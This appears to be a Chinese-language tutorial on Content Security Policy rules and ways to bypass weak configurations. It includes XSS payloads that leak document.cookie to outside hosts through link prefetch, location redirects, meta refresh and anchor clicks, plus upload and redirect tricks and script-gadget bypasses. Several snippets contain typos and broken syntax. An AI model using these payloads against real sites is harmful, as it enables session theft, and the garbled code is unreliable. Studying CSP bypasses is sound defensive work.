### Content Security Policy (CSP) 探究及其绕过

CSP作为在浏览器的防御策略 本质上和同源是一样的

一个简单的CSP规则如下

` header("Content-Security-Policy: default-src 'self';script-src 'self' http://leep0rt.cn")` \

其中 ` default-src` 定义资源默认加载策略

`script-src` 定义JS资源加载策略

类似的还有

` img-src` 作为图片加载策略

`style-src` 作为CSS加载策略



对于CSP想从缺陷上绕过是不可能的

意味着如今的CSP的绕过都是一些松散的匹配绕过



例如存在如下的匹配绕过：

一.蔡徐坤CSP

` header("Content-Secripy-Policy: default-src 'self';script-src *");`

以上规则JS代码可以随意用，天才代码

二.限制只使用本地的CSP

`header("Content-Secripy-Policy: default-src 'self';script-src 'self' ");` 

这个CSP是最常用的一个，限制了JS只能使用本域

但是如果我上传一个图片，其中图片内容为JS代码，那么可以轻松突破限制

例如图片内容为 ` alert(1);//` 

` <script src='upload/tupian.js'>` 

可以成功绕过

三.可信域限制到目录

```
header(" Content-Security-Policy: default-src 'self '; script-src http://127.0.0.1/static/ "); 
```

可以找一个302跳转网站

```
Static/302.php

<?php Header("location: ".$_GET['url'])?>
```

和上一样上传文件加载

```
<script src="static/302.php?url=upload/test.jpg">
```



四.	拒接不可信域的请求

```
header("Content-Security-Policy: default-src 'self'; script-src 'self' ");
```

在上面的CSP规则下，如果我们尝试加载外域的图片，就会被阻止

```
<img src="http://xxxxxx.cn/1.jpg">  ->  阻止
```

在CSP的演变过程中，难免就会出现了一些疏漏

```
<link rel="prefetch" href="http://xxxx.cn"> (H5预加载)(only chrome)
<link rel="dns-prefetch" href="http://xxxxx.cn"> （DNS预加载）
```

在CSP1.0中，对于link的限制并不完整，不同浏览器包括chrome和firefox对CSP的支持都不完整，每个浏览器都维护一份包括CSP1.0、部分CSP2.0、少部分CSP3.0的CSP规则。



五.允许执行内敛脚本

```
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ");
```

允许使用内联资源，如内联的 `<javascript>`元素、`javascript:` URL、内联的事件处理函数和内联的 `style`元素。两侧单引号是必须的。

**页面中直接添加的脚本就可以被执行了。**   

​	**通过js来生成link prefetch** 

​	预先加载(prefetch),它的原理是:  利用浏览器的空闲时间去先下载用户指定需要的内容,然后缓存起来,这样用户下次加载时,就直接从缓存中取出来,效率就快了 

```js
var n0t = document.createElement("link");
n0t.setAttribute("rel", "prefetch");
n0t.setAttribute("href", "//ssssss.com/?" + document.cookie);
document.head.appendChild(n0t);
```

(chrome可以用)

 	**跳转**

在浏览器的机制上， 跳转本身就是跨域行为

```
<script>location.href=http://lorexxar.cn?a+document.cookie</script>

<script>windows.open(http://lorexxar.cn?a=+document.cooke)</script>

<meta http-equiv="refresh" content="5;http://lorexxar.cn?c=[cookie]">
```

通过跨域请求，我们可以把我们想要的各种信息传出

**跨域请求**

在浏览器中，有很多种请求本身就是跨域请求，其中标志就是href。

```
var a=document.createElement("a");
a.href='http://xss.com/?cookie='+escape(document.cookie);
a.click();
```

包括表单的提交，都是跨域请求



### 当今的新CSP

在最近几年，随着CSP被绕过的越来越多，又提出了新的CSP规则

最新的添加nonce随机序列号呀，严格匹配呀

**1、nonce script CSP**

```
header("Content-Security-Policy: default-src 'self'; script-src 'nonce-{random-str}' ");
```

动态的生成nonce字符串，只有包含nonce字段并字符串相等的script块可以被执行。

```
<script nonce="{random-str}">alert(1)</script>
```

这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，只要保证所加载的任何资源都是可信的就可以了。

```
<?php

Header("Content-Security-Policy: script-src 'nonce-".$random." '"");
?>
<script nonce="<?php echo $random?>">
```

bypass:

**Nonce CSP对纯静态的dom xss简直没有防范能力** 

https://lorexxar.cn/2017/05/16/nonce-bypass-script/





**2、strict-dynamic**

```
header("Content-Security-Policy: default-src 'self'; script-src 'strict-dynamic' ");
```

SD意味着可信js生成的js代码是可信的。

这个CSP规则主要是用来适应各种各样的现代前端框架，通过这个规则，可以大幅度避免因为适应框架而变得松散的CSP规则。



Script Gadgets 一种类似于短标签的东西，在现代的js框架中四处可见

```
For example:
Knockout.js

<div data-bind="value: 'foo'"></div>

Eval("foo")

<div data-bind="value: alert(1)"></dib>

bypass
```

Script Gadgets本身就是动态生成的js，所以对新型的CSP几乎是破坏式的Bypass。